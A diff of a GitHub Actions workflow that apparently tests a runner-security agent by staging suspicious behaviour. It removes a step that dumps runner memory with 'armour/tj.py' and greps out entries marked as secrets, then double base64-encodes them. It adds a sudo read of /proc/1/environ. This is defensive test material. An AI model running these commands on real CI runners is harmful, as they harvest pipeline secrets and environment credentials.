@@ -1,4 +1,4 @@
-name: LockDown-Runner-Worker
+name: LockDown-sus-file
 on:
   workflow_dispatch:
 
@@ -15,26 +15,27 @@ jobs:
         uses: actions/checkout@v2
         with:
           fetch-depth: 2
+
+      - name: Checkout Prateek-stepsecurity/pg
+        uses: actions/checkout@v2
+        with:
+          repository: Prateek-stepsecurity/pg
+          path: pg
           
       - name: Curl google
         run: "curl -s https://google.com"
 
-      - name: Execute tj-action
-        run: | 
-          sudo python3 armour/tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
+      - name: grep test /proc/1/environ
+        run: sudo grep test /proc/1/environ
                   
       - name: Curl youtube
+        if: always()
         run: "curl -s https://youtube.com"
 
-      - run: sleep 2
+      - name: sleep 2
+        if: always()
+        run: sleep 2
 
-      - run: ps auxf
-
-      - run: pidof Runner.Worker
-
-
-      - run: sudo journalctl -u agent
-      
       - name: Compress agent log
         if: always()
         continue-on-error: true
